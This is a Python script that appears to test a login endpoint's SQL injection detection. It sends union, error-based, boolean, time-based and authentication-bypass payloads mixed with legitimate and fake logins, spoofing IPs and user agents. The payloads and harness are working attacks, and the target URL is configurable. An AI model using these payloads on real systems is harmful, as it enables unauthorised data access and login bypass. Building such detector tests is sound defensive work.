import sys
import requests
import time
import random
import argparse
import datetime
import logging
import json
from concurrent.futures import ThreadPoolExecutor
from faker import Faker

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='sqli_test_results.log'
)
console = logging.StreamHandler()
console.setLevel(logging.INFO)
logging.getLogger('').addHandler(console)

# Initialize Faker for generating random data
fake = Faker()

# Valid users for legitimate login attempts - username:password pairs
VALID_USERS = {
    "alice": "password1",
    "bob": "password2",
    "charlie": "password3",
    "dave": "password4",
    "eve": "password5"
}

# SQL Injection payloads organized by category
SQLI_PAYLOADS = {
    "Union-Based SQLi": [
        "' UNION SELECT 1,2,3 --",
        "admin' UNION ALL SELECT username, password FROM users --",
        "' UNION+SELECT database(),user(),version() --",
        "1' UNION SELECT @@version,user(),database() --",
        "' UNION ALL SELECT table_name,column_name FROM information_schema.columns --",
    ],
    
    "Error-Based SQLi": [
        "' AND (SELECT 2000 FROM(SELECT COUNT(*),CONCAT(0x7176706271,(SELECT version()),0x7176706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) --",
        "' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --",
        "' AND extractvalue(1, concat(0x7e, (SELECT database()), 0x7e)) --",
        "' OR 1=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
        "admin' AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND 'a'='a",
    ],
    
    "Boolean-Based SQLi": [
        "' OR 1=1 --",
        "admin' OR '1'='1",
        "' AND 1=1 --",
        "username' OR 'a'='a",
        "' OR 1=1 # ",
    ],
    
    "Time-Based SQLi": [
        "' OR (SELECT 1 FROM (SELECT SLEEP(2))A) --",
        "admin'; WAITFOR DELAY '00:00:2' --",
        "' OR SLEEP(3) --",
        "username' OR pg_sleep(2) --",
        "' OR benchmark(1000000,MD5('A')) --",
    ],
    
    "Authentication Bypass": [
        "' OR 1=1 LIMIT 1; --",
        "admin' --",
        "admin'/*",
        "' OR '1'='1' --",
        "username' OR 1=1 --",
    ]
}

def generate_random_ip():
    """Generate a random IP address that looks realistic"""
    return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

def create_random_user_agent():
    """Generate a random, realistic user agent string"""
    browsers = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    ]
    return random.choice(browsers)

def generate_incorrect_login():
    """Generate a random, incorrect login attempt"""
    return (fake.user_name(), fake.password())

def send_login_request(payload, category=None, password=None, use_random_ip=True, url="http://localhost:5000/login"):
    """Send a login request with an SQL injection payload or legitimate credentials"""
    try:
        # Setup headers with random or fixed IP
        headers = {
            "Content-Type": "application/json",
            "User-Agent": create_random_user_agent(),
        }
        
        if use_random_ip:
            headers["X-Forwarded-For"] = generate_random_ip()
        
        # Determine if this is a legitimate login attempt
        is_legitimate = category == "Legitimate"
        is_incorrect = category == "Incorrect"
        
        # For legitimate logins, use the correct password from VALID_USERS
        if is_legitimate and payload in VALID_USERS:
            password_to_use = VALID_USERS[payload]
        else:
            password_to_use = password if password else "invalid_password"
        
        # Prepare payload
        data = {
            "username": payload,
            "password": password_to_use
        }
        
        # Add timing for performance measurement
        start_time = time.time()
        response = requests.post(url, json=data, headers=headers)
        response_time = time.time() - start_time
        
        # Prepare password for logging (redact for security except for legitimate logins)
        log_password = password_to_use if is_legitimate else '[REDACTED]'
        
        # Parse response content
        try:
            response_content = response.json()
        except:
            response_content = response.text
            
        # Log the attempt details
        log_message = (
            f"Category: {category}\n"
            f"Payload: {payload}\n"
            f"Password: {log_password}\n"
            f"Status: {response.status_code}\n"
            f"Response Time: {response_time:.2f}s\n"
            f"Response: {str(response_content)[:100]}...\n"
            f"IP: {headers.get('X-Forwarded-For', 'default')}\n"
            f"{'='*50}"
        )
        logging.info(log_message)
        
        # Attempt to extract error messages or specific patterns that could identify detection
        error_indicators = [
            "sql", "injection", "attack", "malicious", "invalid", "syntax", "error", 
            "blocked", "detected", "security", "violation", "forbidden"
        ]
        
        # Check response for error indicators
        detected = False
        if response.status_code in [400, 403, 429]:
            detected = True
        else:
            response_text = str(response_content).lower()
            for indicator in error_indicators:
                if indicator in response_text:
                    detected = True
                    break
        
        return {
            "category": category,
            "payload": payload,
            "password": log_password if is_legitimate else '[REDACTED]',
            "status_code": response.status_code,
            "response_time": response_time,
            "response_text": str(response_content),
            "ip": headers.get("X-Forwarded-For"),
            "timestamp": datetime.datetime.now().isoformat(),
            "legitimate": is_legitimate,
            "incorrect": is_incorrect,
            "detected": detected,
            "attack": not (is_legitimate or is_incorrect)
        }
    
    except Exception as e:
        logging.error(f"Error sending request with payload '{payload}': {str(e)}")
        return {
            "category": category,
            "payload": payload,
            "error": str(e),
            "timestamp": datetime.datetime.now().isoformat(),
            "legitimate": category == "Legitimate",
            "incorrect": category == "Incorrect",
            "detected": False,
            "attack": not (category == "Legitimate" or category == "Incorrect")
        }

def run_test_sequence(num_requests=100, delay_between_requests=0.5, categories=None, legitimate_percent=10, incorrect_percent=20, url="http://localhost:5000/login"):
    """Run a sequence of SQL injection tests with some legitimate and incorrect login attempts"""
    results = []
    
    # If no specific categories are requested, use all
    if not categories:
        categories = list(SQLI_PAYLOADS.keys())
    
    # Calculate number of legitimate, incorrect, and attack requests
    num_legitimate = int(num_requests * (legitimate_percent / 100))
    num_incorrect = int(num_requests * (incorrect_percent / 100))
    num_attacks = num_requests - num_legitimate - num_incorrect
    
    # Make sure we have at least one legitimate login attempt
    if num_legitimate < 1 and legitimate_percent > 0:
        num_legitimate = 1
        num_attacks -= 1  # Reduce attack count to maintain total request count
    
    # Build a list of attack payloads from the requested categories
    attack_payloads = []
    attack_categories = []
    
    # Distribute the requested number of payloads across categories
    payloads_per_category = max(1, num_attacks // len(categories))
    remaining = num_attacks
    
    for category in categories:
        # Get payloads for this category
        category_payloads = SQLI_PAYLOADS[category]
        
        # How many to select from this category
        n_select = min(payloads_per_category, len(category_payloads), remaining)
        
        # Randomly select payloads from this category
        selected = random.sample(category_payloads, n_select) if n_select <= len(category_payloads) else category_payloads
        
        for payload in selected:
            attack_payloads.append(payload)
            attack_categories.append(category)
            remaining -= 1
            
            if remaining <= 0:
                break
                
        if remaining <= 0:
            break
    
    # If we still have remaining attack payloads to select, add more from random categories
    while remaining > 0:
        category = random.choice(categories)
        payload = random.choice(SQLI_PAYLOADS[category])
        attack_payloads.append(payload)
        attack_categories.append(category)
        remaining -= 1
    
    # Create legitimate login attempts using valid credentials
    legitimate_payloads = []
    legitimate_categories = []
    
    for _ in range(num_legitimate):
        user = random.choice(list(VALID_USERS.keys()))
        legitimate_payloads.append(user)
        legitimate_categories.append("Legitimate")
    
    # Create incorrect login attempts
    incorrect_payloads = []
    incorrect_categories = []
    incorrect_passwords = []
    
    for _ in range(num_incorrect):
        username, password = generate_incorrect_login()
        incorrect_payloads.append(username)
        incorrect_categories.append("Incorrect")
        incorrect_passwords.append(password)
    
    # Combine all payloads and categories
    all_payloads = attack_payloads + legitimate_payloads + incorrect_payloads
    all_categories = attack_categories + legitimate_categories + incorrect_categories
    
    # Add the incorrect passwords to a combined list with None for other types
    all_passwords = [None] * len(attack_payloads + legitimate_payloads) + incorrect_passwords
    
    # Shuffle them together to mix legitimate, incorrect, and attack traffic
    combined = list(zip(all_payloads, all_categories, all_passwords))
    random.shuffle(combined)
    all_payloads, all_categories, all_passwords = zip(*combined)
    
    # Run the tests sequentially or in parallel
    use_parallel = num_requests > 10  # Use parallel for larger tests
    
    if use_parallel:
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for i, payload in enumerate(all_payloads):
                # Add random delay to simulate more realistic traffic
                time.sleep(random.uniform(0, delay_between_requests))
                
                # Use the appropriate password
                password = all_passwords[i]
                
                futures.append(executor.submit(
                    send_login_request, 
                    payload, 
                    all_categories[i],
                    password,
                    True,
                    url
                ))
            
            for future in futures:
                results.append(future.result())
    else:
        for i, payload in enumerate(all_payloads):
            # Use the appropriate password
            password = all_passwords[i]
            
            results.append(send_login_request(
                payload, 
                all_categories[i],
                password,
                True,
                url
            ))
            time.sleep(delay_between_requests)
    
    return results

def save_results_to_file(results, filename="sqli_test_results.json"):
    """Save test results to a JSON file"""
    with open(filename, "w") as f:
        json.dump(results, f, indent=2)
    
    logging.info(f"Results saved to {filename}")

if __name__ == "__main__":
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='SQL Injection Testing Tool')
    parser.add_argument('--url', type=str, default='http://localhost:5000/login', 
                        help='URL of the login endpoint to test')
    parser.add_argument('--requests', type=int, default=100, 
                        help='Number of requests to send')
    parser.add_argument('--delay', type=float, default=0.5, 
                        help='Delay between requests in seconds')
    parser.add_argument('--legitimate', type=int, default=10, 
                        help='Percentage of legitimate login attempts')
    parser.add_argument('--incorrect', type=int, default=20, 
                        help='Percentage of incorrect login attempts')
    parser.add_argument('--output', type=str, default='sqli_test_results.json',
                        help='Output file to save results')
    args = parser.parse_args()
    
    # Run the test sequence
    print(f"Starting SQL injection testing against {args.url}")
    print(f"Sending {args.requests} requests with {args.legitimate}% legitimate and {args.incorrect}% incorrect login attempts")
    
    results = run_test_sequence(
        num_requests=args.requests,
        delay_between_requests=args.delay,
        legitimate_percent=args.legitimate,
        incorrect_percent=args.incorrect,
        url=args.url
    )
    
    # Save results
    save_results_to_file(results, args.output)
    print(f"Test completed. Results saved to {args.output}")